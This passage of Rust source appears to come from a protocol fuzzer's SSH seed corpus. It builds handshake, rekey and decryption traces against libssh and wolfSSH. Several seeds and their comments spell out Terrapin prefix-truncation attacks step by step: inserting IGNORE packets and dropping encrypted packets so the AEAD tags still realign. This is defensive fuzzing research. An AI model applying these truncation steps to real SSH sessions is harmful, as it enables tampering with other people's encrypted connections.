            InputAction::new_step(server, term! { @chan_data }),
            InputAction::new_step(server, term! { @chan_ext_data }),
            InputAction::new_step(server, term! { @chan_eof }),
            InputAction::new_step(server, term! { @chan_close }),
        ],
        ..Default::default()
    }
}

/// Rekey seed: complete the first key exchange, then drive a **client-initiated
/// rekey** (RFC 4253 §9) by sending — encrypted under the first set of keys — a
/// second KEXINIT, a second ECDH_INIT (reusing our ephemeral), and a second
/// NEWKEYS. This exercises the server's re-KEX state machine while a session is
/// already established: KEXINIT dispatch mid-session, rekey entry, a second ECDH,
/// and the second NEWKEYS key switch — a large code path no handshake-only seed
/// reaches, and the area where strict-kex re-arming / Terrapin-class issues live.
/// We don't send post-rekey traffic (that would need the re-derived keys), so the
/// whole rekey handshake rides on the first keys, which is correct: KEXINIT2 /
/// ECDH_INIT2 / NEWKEYS2 are all sent under the old cipher (NEWKEYS2 is the last
/// packet before the switch). AES-256-GCM, c2s counter = packet index since the
/// first NewKeys.
pub fn seed_client_attacker_rekey(server: AgentName) -> Trace<SshProtocolTypes> {
    let server_banner_id = term! { fn_banner_id(((server, 0)[None]/RawSshMessage)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw = term! { (server, 2)[None]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };

    let our_kexinit = term! { fn_client_kexinit_aesgcm((fn_placeholder_16bytes)) };
    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    let key = term! { fn_derive_aes_key_c2s((@shared), (@exch_hash), (@exch_hash)) };
    let iv = term! { fn_derive_iv_c2s((@shared), (@exch_hash), (@exch_hash)) };

    // libssh's packet filter only permits a rekey KEXINIT once the connection is
    // established, so authenticate first (publickey, key A; counters 0,1).
    let svc_req = term! {
        fn_encrypt_packet_aesgcm((fn_service_request((fn_ssh_userauth))), (@key), (@iv), (fn_u32_0))
    };
    let sig = term! {
        fn_sign_userauth((@exch_hash), (fn_username), (fn_ssh_connection), (fn_client_a_pubkey_blob))
    };
    let auth_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_user_auth_request(
                (fn_username), (fn_ssh_connection), (fn_method_publickey),
                (fn_publickey_auth_data((fn_client_a_pubkey_blob), (@sig)))
            )),
            (@key), (@iv), (fn_u32_1))
    };

    // Rekey handshake, encrypted under the first keys (c2s counters 2,3,4).
    let rekey_kexinit = term! {
        fn_encrypt_packet_aesgcm(
            (fn_client_kexinit_aesgcm((fn_cookie_zeros))), (@key), (@iv), (fn_u32_2))
    };
    let rekey_ecdh_init = term! {
        fn_encrypt_packet_aesgcm(
            (fn_kex_ecdh_init((fn_client_ecdh_pubkey))), (@key), (@iv), (fn_u32_3))
    };
    let rekey_newkeys = term! {
        fn_encrypt_packet_aesgcm((fn_new_keys), (@key), (@iv), (fn_u32_4))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @svc_req }),
            InputAction::new_step(server, term! { @auth_req }),
            InputAction::new_step(server, term! { @rekey_kexinit }),
            InputAction::new_step(server, term! { @rekey_ecdh_init }),
            InputAction::new_step(server, term! { @rekey_newkeys }),
        ],
        ..Default::default()
    }
}

// ── Seed: server attacker with full handshake ─────────────────────────────────
//
// The fuzzer acts as the SSH server; the client is a real libssh instance.
// We use our embedded RSA key to sign the exchange hash so libssh will accept
// the ECDH reply. Then we send encrypted server-to-client messages after NewKeys.

pub fn seed_server_attacker_full(client: AgentName) -> Trace<SshProtocolTypes> {
    // After OutputAction(client):
    //   (client, 0)[None]/RawSshMessage → client banner
    //   (client, 0)[None]/SshMessage    → client KexInit
    // After sending banner + kexinit, client sends KexEcdhInit:
    //   (client, 0)[None]/SshBytes      → client ephemeral pubkey Q_C

    let client_banner_raw = term! { (client, 0)[None]/RawSshMessage };
    let client_banner_id = term! { fn_banner_id((@client_banner_raw)) };
    let client_kexinit = term! { (client, 0)[None]/SshMessage };
    let q_c = term! { (client, 0)[None]/SshBytes };

    let our_kexinit = term! {
        fn_kex_init(
            (fn_placeholder_16bytes),
            ((client, 0)[None]/KexAlgorithms),
            ((client, 0)[None]/SignatureSchemes),
            ((client, 0)[None]/EncryptionAlgorithms),
            ((client, 1)[None]/EncryptionAlgorithms),
            ((client, 0)[None]/MacAlgorithms),
            ((client, 1)[None]/MacAlgorithms),
            ((client, 0)[None]/CompressionAlgorithms),
            ((client, 1)[None]/CompressionAlgorithms)
        )
    };

    let shared = term! {
        fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@q_c))
    };

    let i_c = term! { fn_kexinit_payload((@client_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@our_kexinit)) };

    let exch_hash = term! {
        fn_kex_exchange_hash(
            (@client_banner_id),
            (fn_puffin_id),
            (@i_c),
            (@i_s),
            (fn_server_rsa_pubkey_bytes),
            (@q_c),
            (fn_client_ecdh_pubkey),
            (@shared)
        )
    };

    let sig = term! { fn_sign_exchange_hash((@exch_hash)) };

    let enc_key_s2c = term! {
        fn_derive_enc_key_s2c((@shared), (@exch_hash), (@exch_hash))
    };

    // Sequence numbers for the server attacker:
    // Attacker sends: banner (not counted), KexInit(0), KexEcdhReply(1), NewKeys(2)
    // First encrypted packets: ServiceAccept(3), UserAuthSuccess(4)
    let svc_accept = term! {
        fn_encrypt_packet(
            (fn_service_accept((fn_ssh_userauth))),
            (@enc_key_s2c),
            (fn_u32_3)
        )
    };
    let auth_success = term! {
        fn_encrypt_packet(
            (fn_user_auth_success),
            (@enc_key_s2c),
            (fn_u32_4)
        )
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            client,
            SshDescriptorConfig {
                typ: AgentType::Client,
                try_reuse: false,
            },
        )],
        steps: vec![
            OutputAction::new_step(client),
            InputAction::new_step(client, term! { fn_banner(fn_puffin_banner) }),
            InputAction::new_step(client, term! { fn_packet((@our_kexinit)) }),
            // After sending kexinit, client emits KexEcdhInit (captured as q_c above)
            InputAction::new_step(
                client,
                term! {
                    fn_packet((fn_kex_ecdh_reply(
                        (fn_server_rsa_pubkey),
                        (fn_client_ecdh_pubkey),
                        (fn_ssh_signature(
                            (fn_algo_rsa_sha2_256),
                            (@sig)
                        ))
                    )))
                },
            ),
            InputAction::new_step(client, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(client, term! { @svc_accept }),
            InputAction::new_step(client, term! { @auth_success }),
        ],
        ..Default::default()
    }
}

// ── Seed: server attacker full handshake over AES-256-GCM ─────────────────────
//
// Fuzzer is the SERVER; the libssh/wolfSSH client is the PUT. Forces
// aes256-gcm@openssh.com and offers only rsa-sha2-256 as the host-key algorithm
// (so the negotiated algorithm matches the rsa-sha2-256 signature). Completes
// the full handshake + encrypted server responses against BOTH implementations.
pub fn seed_server_attacker_full_aesgcm(client: AgentName) -> Trace<SshProtocolTypes> {
    let client_banner_id = term! { fn_banner_id(((client, 0)[None]/RawSshMessage)) };
    let client_kexinit = term! { (client, 0)[None]/SshMessage };
    let q_c = term! { (client, 0)[None]/SshBytes };

    // Fixed server KexInit (aes256-gcm, rsa-sha2-256 host key).
    let our_kexinit = term! { fn_server_kexinit_aesgcm((fn_placeholder_16bytes)) };

    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@q_c)) };
    let i_c = term! { fn_kexinit_payload((@client_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@our_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (@client_banner_id), (fn_puffin_id), (@i_c), (@i_s),
            (fn_server_rsa_pubkey_bytes), (@q_c), (fn_client_ecdh_pubkey), (@shared)
        )
    };
    let sig = term! { fn_sign_exchange_hash((@exch_hash)) };
    // s2c AES-256-GCM key + IV (direction the server encrypts towards the client).
    let key = term! { fn_derive_aes_key_s2c((@shared), (@exch_hash), (@exch_hash)) };
    let iv = term! { fn_derive_iv_s2c((@shared), (@exch_hash), (@exch_hash)) };

    let svc_accept = term! {
        fn_encrypt_packet_aesgcm((fn_service_accept((fn_ssh_userauth))), (@key), (@iv), (fn_u32_0))
    };
    let auth_success = term! {
        fn_encrypt_packet_aesgcm((fn_user_auth_success), (@key), (@iv), (fn_u32_1))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            client,
            SshDescriptorConfig {
                typ: AgentType::Client,
                try_reuse: false,
            },
        )],
        steps: vec![
            OutputAction::new_step(client),
            InputAction::new_step(client, term! { fn_banner(fn_puffin_banner) }),
            InputAction::new_step(client, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                client,
                term! {
                    fn_packet((fn_kex_ecdh_reply(
                        (fn_server_rsa_pubkey),
                        (fn_client_ecdh_pubkey),
                        (fn_ssh_signature((fn_algo_rsa_sha2_256), (@sig)))
                    )))
                },
            ),
            InputAction::new_step(client, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(client, term! { @svc_accept }),
            InputAction::new_step(client, term! { @auth_success }),
        ],
        ..Default::default()
    }
}

/// Differential-fuzzing decryption recipes for a libssh **server** agent.
///
/// After NewKeys the server's responses are opaque `OnWire` ciphertext, so to
/// compare two PUTs structurally we reconstruct the server→client (s2c) key
/// from the server's observed KEX output (exactly as `seed_client_attacker_full`
/// derives the c2s key, but for the 'D' direction) and decrypt each encrypted
/// server output back into a typed `SshMessage`.
///
/// The s2c sequence number after NewKeys depends on whether the server enabled
/// strict KEX (Terrapin mitigation): strict resets the counter to 0, otherwise
/// it continues (KexInit=0, KexEcdhReply=1, NewKeys=2 → first encrypted = 3).
/// We therefore emit a recipe at BOTH the strict (0,1,2) and non-strict (3,4,5)
/// sequence numbers for each of the first three encrypted outputs; the wrong
/// seqno fails the Poly1305 tag and is skipped during evaluation, so each PUT's
/// decrypted store fills in message order and the two stores stay aligned.
pub fn server_decryption_recipes(server: AgentName) -> Vec<Term<SshProtocolTypes>> {
    // Reconstruct the exchange hash from the server's KEX output (mirrors
    // seed_client_attacker_full).
    let server_banner_id = term! { fn_banner_id(((server, 0)[None]/RawSshMessage)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw = term! { (server, 2)[None]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! {
        fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub))
    };
    let our_kexinit = term! {
        fn_kex_init(
            (fn_placeholder_16bytes),
            ((server, 0)[None]/KexAlgorithms),
            ((server, 0)[None]/SignatureSchemes),
            ((server, 0)[None]/EncryptionAlgorithms),
            ((server, 1)[None]/EncryptionAlgorithms),
            ((server, 0)[None]/MacAlgorithms),
            ((server, 1)[None]/MacAlgorithms),
            ((server, 0)[None]/CompressionAlgorithms),
            ((server, 1)[None]/CompressionAlgorithms)
        )
    };
    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id),
            (@server_banner_id),
            (@i_c),
            (@i_s),
            (@server_hostkey),
            (fn_client_ecdh_pubkey),
            (@server_ecdh_pub),
            (@shared)
        )
    };
    let key = term! { fn_derive_enc_key_s2c((@shared), (@exch_hash), (@exch_hash)) };

    // Decrypt each of the first three encrypted server outputs at both the
    // strict (0,1,2) and non-strict (3,4,5) s2c sequence numbers. The wrong
    // seqno fails the Poly1305 tag during evaluation and is skipped, so both
    // PUTs' decrypted stores fill in message order and stay aligned.
    let mk = |idx_term: Term<SshProtocolTypes>, seqno: Term<SshProtocolTypes>| {
        let key = key.clone();
        term! { fn_decrypt_packet((@idx_term), (@key), (@seqno)) }
    };

    vec![
        mk(term! { (server, 0)[None]/OnWireData }, term! { fn_u32_0 }),
        mk(term! { (server, 0)[None]/OnWireData }, term! { fn_u32_3 }),
        mk(term! { (server, 1)[None]/OnWireData }, term! { fn_u32_1 }),
        mk(term! { (server, 1)[None]/OnWireData }, term! { fn_u32_4 }),
        mk(term! { (server, 2)[None]/OnWireData }, term! { fn_u32_2 }),
        mk(term! { (server, 2)[None]/OnWireData }, term! { fn_u32_5 }),
    ]
}

/// Two-honest-party handshake: both the client and the server are real PUTs,
/// and the Dolev-Yao attacker sits on the wire, here simply relaying each
/// party's output flight to the other faithfully (the benign baseline). This is
/// the trace shape required for the *matching-conversation* property — a
/// security property that is only definable with two honest endpoints to
/// compare. Mutations of this seed (drop / insert / reorder relayed messages)
/// are what a transcript-integrity attack like Terrapin would exercise.
pub fn seed_handshake_two_party(client: AgentName, server: AgentName) -> Trace<SshProtocolTypes> {
    Trace {
        prior_traces: vec![],
        descriptors: vec![
            AgentDescriptor::from_config(
                client,
                SshDescriptorConfig {
                    typ: AgentType::Client,
                    try_reuse: false,
                },
            ),
            AgentDescriptor::from_config(
                server,
                SshDescriptorConfig {
                    typ: AgentType::Server,
                    try_reuse: false,
                },
            ),
        ],
        steps: vec![
            // Bootstrap: both peers emit their banner + KEXINIT without waiting.
            OutputAction::new_step(client),
            OutputAction::new_step(server),
            // Relay, letting each delivery drive the receiver's next output.
            InputAction::new_step(server, term! { (client, 0)/RawSshMessageFlight }),
            InputAction::new_step(client, term! { (server, 0)/RawSshMessageFlight }),
            InputAction::new_step(server, term! { (client, 1)/RawSshMessageFlight }),
            InputAction::new_step(client, term! { (server, 1)/RawSshMessageFlight }),
            InputAction::new_step(server, term! { (client, 2)/RawSshMessageFlight }),
            InputAction::new_step(client, term! { (server, 2)/RawSshMessageFlight }),
            InputAction::new_step(server, term! { (client, 3)/RawSshMessageFlight }),
            InputAction::new_step(client, term! { (server, 3)/RawSshMessageFlight }),
            InputAction::new_step(server, term! { (client, 4)/RawSshMessageFlight }),
            InputAction::new_step(client, term! { (server, 4)/RawSshMessageFlight }),
        ],
        ..Default::default()
    }
}

/// Hybrid Terrapin attempt: relay the handshake at **flight** granularity
/// (preserving each PUT's I/O batching, so it completes) but at the targeted
/// c2s point (a) insert a cleartext `SSH_MSG_IGNORE` before the client's NEWKEYS
/// — bumping the server's c2s sequence number by one — and (b) forward the
/// client's post-NEWKEYS encrypted packets individually as `OnWireData`,
/// **dropping the first one**. The inserted IGNORE and the dropped packet cancel
/// in the sequence counter, so the server's AEAD tags still verify (Terrapin
/// prefix truncation). If the dropped packet is ignorable (e.g. EXT_INFO) both
/// peers still complete, but the server never saw it — and the trace-aware
/// matching-conversation oracle flags the divergence. On strict-kex (0.11.4) the
/// server must abort on the IGNORE during KEX, so it never completes.
pub fn seed_terrapin_attempt(client: AgentName, server: AgentName) -> Trace<SshProtocolTypes> {
    Trace {
        prior_traces: vec![],
        descriptors: vec![
            AgentDescriptor::from_config(
                client,
                SshDescriptorConfig {
                    typ: AgentType::Client,
                    try_reuse: false,
                },
            ),
            AgentDescriptor::from_config(
                server,
                SshDescriptorConfig {
                    typ: AgentType::Server,
                    try_reuse: false,
                },
            ),
        ],
        steps: vec![
            OutputAction::new_step(client),
            OutputAction::new_step(server),
            // Cleartext handshake, flight-forwarded (batching preserved).
            InputAction::new_step(server, term! { (client, 0)/RawSshMessageFlight }), // banner
            InputAction::new_step(client, term! { (server, 0)/RawSshMessageFlight }),
            InputAction::new_step(server, term! { (client, 1)/RawSshMessageFlight }), // KEXINIT
            InputAction::new_step(client, term! { (server, 1)/RawSshMessageFlight }),
            InputAction::new_step(server, term! { (client, 2)/RawSshMessageFlight }), // ECDH_INIT
            InputAction::new_step(client, term! { (server, 2)/RawSshMessageFlight }), // ECDH_REPLY+NEWKEYS
            // (a) INSERT a cleartext IGNORE into c2s before the client's NEWKEYS:
            // bumps the server's c2s receive sequence number by 1.
            InputAction::new_step(
                server,
                term! { fn_packet((fn_ignore((fn_ssh_bytes_empty)))) },
            ),
            InputAction::new_step(server, term! { (client, 3)/RawSshMessageFlight }), // client NEWKEYS
            InputAction::new_step(client, term! { (server, 3)/RawSshMessageFlight }),
            // (b) Forward the client's encrypted c2s packets individually, DROPPING
            // the first (OnWire 0). With the +1 from the IGNORE, the server's
            // counter realigns on OnWire 1, so tags still verify.
            InputAction::new_step(server, term! { (client, 1)/OnWireData }),
            InputAction::new_step(client, term! { (server, 4)/RawSshMessageFlight }),
            InputAction::new_step(server, term! { (client, 2)/OnWireData }),
            InputAction::new_step(client, term! { (server, 5)/RawSshMessageFlight }),
        ],
        ..Default::default()
    }
}

/// Packet-granular two-honest-party relay: forwards **one message per step**
/// (cleartext as `RawSshMessage`, encrypted as byte-faithful `OnWireData`)
/// instead of whole flights. This makes every packet — including each
/// post-NEWKEYS encrypted packet — an individually droppable/reorderable step,
/// the representation a prefix-truncation attack (Terrapin) needs (the
/// flight-granular relay could only drop whole flights).
///
/// STATUS: WIP. The cleartext handshake and the first encrypted exchange
/// (SERVICE_REQUEST / SERVICE_ACCEPT) relay correctly packet-by-packet, proving
/// individual encrypted packets are forwardable. But the handshake does NOT
/// complete: forcing one-message-per-step desynchronises libssh's reactive
/// output *batching* (the real client stops emitting USERAUTH_REQUEST after
/// SERVICE_ACCEPT, regardless of progress pumping), whereas the flight-granular
/// relay completes precisely because it preserves that batching. Finding: even
/// with packet-granularity, driving two real PUTs to completion one packet at a
/// time fights the libraries' I/O batching — which further explains why the
/// fuzzer is unlikely to *maintain* a completing handshake while mutating toward
/// Terrapin. Not in the corpus until it completes.
pub fn seed_handshake_two_party_packet(
    client: AgentName,
    server: AgentName,
) -> Trace<SshProtocolTypes> {
    Trace {
        prior_traces: vec![],
        descriptors: vec![
            AgentDescriptor::from_config(
                client,
                SshDescriptorConfig {
                    typ: AgentType::Client,
                    try_reuse: false,
                },
            ),
            AgentDescriptor::from_config(
                server,
                SshDescriptorConfig {
                    typ: AgentType::Server,
                    try_reuse: false,
                },
            ),
        ],
        steps: vec![
            OutputAction::new_step(client),
            OutputAction::new_step(server),
            // Cleartext handshake, one packet per step.
            InputAction::new_step(server, term! { (client, 0)/RawSshMessage }), // banner
            InputAction::new_step(client, term! { (server, 0)/RawSshMessage }), // banner
            InputAction::new_step(server, term! { (client, 1)/RawSshMessage }), // KEXINIT
            InputAction::new_step(client, term! { (server, 1)/RawSshMessage }), // KEXINIT
            InputAction::new_step(server, term! { (client, 2)/RawSshMessage }), // KEX_ECDH_INIT
            InputAction::new_step(client, term! { (server, 2)/RawSshMessage }), // KEX_ECDH_REPLY
            InputAction::new_step(client, term! { (server, 3)/RawSshMessage }), // server NEWKEYS
            InputAction::new_step(server, term! { (client, 3)/RawSshMessage }), // client NEWKEYS
            // Encrypted phase: forward each post-NEWKEYS packet as raw OnWireData
            // (byte-faithful; RawSshMessage can't represent ciphertext). OnWireData
            // is indexed per encrypted packet (0-based), and each is an
            // individually droppable step — the representation Terrapin needs.
            // Empty output reads don't add knowledge, so pump liberally.
            OutputAction::new_step(client),
            OutputAction::new_step(client), // SERVICE_REQUEST (client OnWire 0)
            InputAction::new_step(server, term! { (client, 0)/OnWireData }),
            OutputAction::new_step(server),
            OutputAction::new_step(server), // SERVICE_ACCEPT (server OnWire 0)
            InputAction::new_step(client, term! { (server, 0)/OnWireData }),
            OutputAction::new_step(client),
            OutputAction::new_step(client),
            OutputAction::new_step(client), // USERAUTH_REQUEST (client OnWire 1)
            InputAction::new_step(server, term! { (client, 1)/OnWireData }),
            OutputAction::new_step(server),
            OutputAction::new_step(server), // USERAUTH_SUCCESS (server OnWire 1)
            InputAction::new_step(client, term! { (server, 1)/OnWireData }),
            OutputAction::new_step(client),
        ],
        ..Default::default()
    }
}

/// Packet-granular Terrapin attempt (c2s prefix truncation). Relays the
/// cleartext handshake one packet per step, inserts a cleartext IGNORE to the
/// server just before the client's NEWKEYS (bumping the server's c2s receive
/// sequence number by 1), then in the encrypted phase DROPS the client's first
/// post-NewKeys packet (OnWire 0, send-seqno 3) and forwards the second (OnWire
/// 1, send-seqno 4) to the server, which after the +1 IGNORE is now at receive
/// seqno 4 — so AEAD tags would realign and the truncation be invisible.
///
/// EMPIRICAL FINDING (libssh 0.10.4): this c2s direction does NOT work — the
/// client emits only a SINGLE post-NewKeys packet (SERVICE_REQUEST) and then
/// waits for the server's reply, so there is no second packet (OnWire 1) to
/// realign onto, and no *ignorable* first packet to drop (SERVICE_REQUEST is
/// mandatory — dropping it stalls auth). A tag-preserving Terrapin truncation
/// therefore needs the S2C direction, where the server sends an EXT_INFO
/// (ignorable) as its first post-NewKeys packet: drop that, forward the next,
/// realign on the client side. That requires ext-info to be negotiated and a
/// s2c packet-granular relay — the remaining work to make the
/// matching-conversation oracle fire on a completed Terrapin. On strict-kex
/// (0.11.4) the injected IGNORE is rejected during KEX, mitigating regardless.
pub fn seed_terrapin_packet(client: AgentName, server: AgentName) -> Trace<SshProtocolTypes> {
    Trace {
        prior_traces: vec![],
        descriptors: vec![
            AgentDescriptor::from_config(
                client,
                SshDescriptorConfig {
                    typ: AgentType::Client,
                    try_reuse: false,
                },
            ),
            AgentDescriptor::from_config(
                server,
                SshDescriptorConfig {
                    typ: AgentType::Server,
                    try_reuse: false,
                },
            ),
        ],
        steps: vec![
            OutputAction::new_step(client),
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { (client, 0)/RawSshMessage }), // banner
            InputAction::new_step(client, term! { (server, 0)/RawSshMessage }), // banner
            InputAction::new_step(server, term! { (client, 1)/RawSshMessage }), // KEXINIT
            InputAction::new_step(client, term! { (server, 1)/RawSshMessage }), // KEXINIT
            InputAction::new_step(server, term! { (client, 2)/RawSshMessage }), // ECDH_INIT
            InputAction::new_step(client, term! { (server, 2)/RawSshMessage }), // ECDH_REPLY
            InputAction::new_step(client, term! { (server, 3)/RawSshMessage }), // server NEWKEYS
            // (a) insert IGNORE to server before client NEWKEYS (+1 server c2s seqno)
            InputAction::new_step(
                server,
                term! { fn_packet((fn_ignore((fn_ssh_bytes_empty)))) },
            ),
            InputAction::new_step(server, term! { (client, 3)/RawSshMessage }), // client NEWKEYS
            // pump the client to emit its post-NewKeys encrypted packets
            OutputAction::new_step(client),
            OutputAction::new_step(client),
            OutputAction::new_step(client),
            // (b) DROP client OnWire 0 (seqno 3); forward OnWire 1 (seqno 4)
            InputAction::new_step(server, term! { (client, 1)/OnWireData }),
            OutputAction::new_step(server),
            OutputAction::new_step(server),
        ],
        ..Default::default()
    }
}

/// S2C Terrapin prefix truncation (the direction the c2s attempt showed is
/// needed). Packet-granular relay; insert a cleartext IGNORE to the **client**
/// just before the server's NEWKEYS (+1 the client's s2c receive seqno), then in
/// the encrypted phase DROP the server's first post-NewKeys packet — its
/// EXT_INFO, which is ignorable — and forward every later server packet shifted
/// by one (its send-seqno now matches the client's +1 receive seqno, so AEAD
/// tags realign). The client completes auth never having seen EXT_INFO, so the
/// server's sent transcript and the client's received transcript diverge → the
/// matching-conversation oracle fires. On strict-kex (0.11.4) the IGNORE is
/// rejected during KEX, mitigating. (Relies on the real libssh peers negotiating
/// ext-info, which recent libssh does by default.)
pub fn seed_terrapin_s2c(client: AgentName, server: AgentName) -> Trace<SshProtocolTypes> {
    Trace {
        prior_traces: vec![],
        descriptors: vec![
            AgentDescriptor::from_config(
                client,
                SshDescriptorConfig {
                    typ: AgentType::Client,
                    try_reuse: false,
                },
            ),
            AgentDescriptor::from_config(
                server,
                SshDescriptorConfig {
                    typ: AgentType::Server,
                    try_reuse: false,
                },
            ),
        ],
        steps: vec![
            OutputAction::new_step(client),
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { (client, 0)/RawSshMessage }), // banner c->s
            InputAction::new_step(client, term! { (server, 0)/RawSshMessage }), // banner s->c
            InputAction::new_step(server, term! { (client, 1)/RawSshMessage }), // KEXINIT c->s
            InputAction::new_step(client, term! { (server, 1)/RawSshMessage }), // KEXINIT s->c
            InputAction::new_step(server, term! { (client, 2)/RawSshMessage }), // ECDH_INIT c->s
            InputAction::new_step(client, term! { (server, 2)/RawSshMessage }), // ECDH_REPLY s->c
            // (a) insert IGNORE to the CLIENT before the server's NEWKEYS (+1 client s2c seqno)
            InputAction::new_step(
                client,
                term! { fn_packet((fn_ignore((fn_ssh_bytes_empty)))) },
            ),
            InputAction::new_step(client, term! { (server, 3)/RawSshMessage }), // server NEWKEYS s->c
            InputAction::new_step(server, term! { (client, 3)/RawSshMessage }), // client NEWKEYS c->s
            // Encrypted phase. Forward client's c2s packets normally; on s2c DROP
            // the server's OnWire 0 (EXT_INFO, seqno 3) and forward OnWire 1.. only.
            OutputAction::new_step(server), // pump server to emit EXT_INFO (OnWire 0, dropped)
            OutputAction::new_step(server),
            OutputAction::new_step(client),
            OutputAction::new_step(client), // client SERVICE_REQUEST (OnWire 0)
            InputAction::new_step(server, term! { (client, 0)/OnWireData }), // -> server
            OutputAction::new_step(server),
            OutputAction::new_step(server), // server SERVICE_ACCEPT (OnWire 1, seqno 4)
            InputAction::new_step(client, term! { (server, 1)/OnWireData }), // forward (drop OnWire 0)
            OutputAction::new_step(client),
            OutputAction::new_step(client), // client USERAUTH_REQUEST (OnWire 1)
            InputAction::new_step(server, term! { (client, 1)/OnWireData }), // -> server
            OutputAction::new_step(server),
            OutputAction::new_step(server), // server USERAUTH_SUCCESS (OnWire 2)
            InputAction::new_step(client, term! { (server, 2)/OnWireData }), // forward realigned
            OutputAction::new_step(client),
        ],
        ..Default::default()
    }
}

/// AES-256-GCM counterpart of [`server_decryption_recipes`], for the AES-GCM
/// flow (mirrors `seed_client_attacker_full_aesgcm`). Decrypts the server's
/// first three post-NewKeys s2c packets. The GCM invocation counter restarts at
/// 0 at NewKeys, so it matches the per-direction packet index directly (no
/// strict/non-strict ambiguity as in the ChaCha20 case).
pub fn server_decryption_recipes_aesgcm(server: AgentName) -> Vec<Term<SshProtocolTypes>> {
    let server_banner_id = term! { fn_banner_id(((server, 0)[None]/RawSshMessage)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw = term! { (server, 2)[None]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };

    // The client KexInit is the fixed AES-GCM offer, so I_C is reconstructible
    // without consulting any PUT knowledge.
    let our_kexinit = term! { fn_client_kexinit_aesgcm((fn_placeholder_16bytes)) };
    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    let key = term! { fn_derive_aes_key_s2c((@shared), (@exch_hash), (@exch_hash)) };
    let iv = term! { fn_derive_iv_s2c((@shared), (@exch_hash), (@exch_hash)) };

    let mk = |idx_term: Term<SshProtocolTypes>, counter: Term<SshProtocolTypes>| {
        let key = key.clone();
        let iv = iv.clone();
        term! { fn_decrypt_packet_aesgcm((@idx_term), (@key), (@iv), (@counter)) }
    };

    vec![
        mk(term! { (server, 0)[None]/OnWireData }, term! { fn_u32_0 }),
        mk(term! { (server, 1)[None]/OnWireData }, term! { fn_u32_1 }),
        mk(term! { (server, 2)[None]/OnWireData }, term! { fn_u32_2 }),
    ]
}

pub fn create_corpus(
    _put: &dyn puffin::put_registry::Factory<SshProtocolBehavior>,
) -> Vec<(Trace<SshProtocolTypes>, &'static str)> {
    let client = AgentName::first();
    let server = client.next();

    // Only seeds that complete a full handshake are kept (the legacy mutual /
    // pre-crypto stub seeds were pruned). The chacha20 *_full seeds complete on
    // libssh; the *_aesgcm seeds complete on BOTH libssh and wolfSSH.
    vec![
        (
            seed_client_attacker_full(server),
            "seed_client_attacker_full",
        ),
        (
            seed_server_attacker_full(client),
            "seed_server_attacker_full",
        ),
        (
            seed_client_attacker_full_aesgcm(server),
            "seed_client_attacker_full_aesgcm",
        ),
        // Same handshake but with a synthesized KEXINIT whose algorithm lists are
        // mutable sub-terms — the entry point for negotiation / downgrade fuzzing.
        (
            seed_client_attacker_full_kexinit_synth(server),
            "seed_client_attacker_full_kexinit_synth",
        ),
        // Non-AEAD suite (aes256-ctr + hmac-sha2-256): drives the separate
        // cipher + separate-MAC code path, distinct from the AEAD seeds.
        (
            seed_client_attacker_full_ctr(server),
            "seed_client_attacker_full_ctr",
        ),
        (
            seed_server_attacker_full_aesgcm(client),
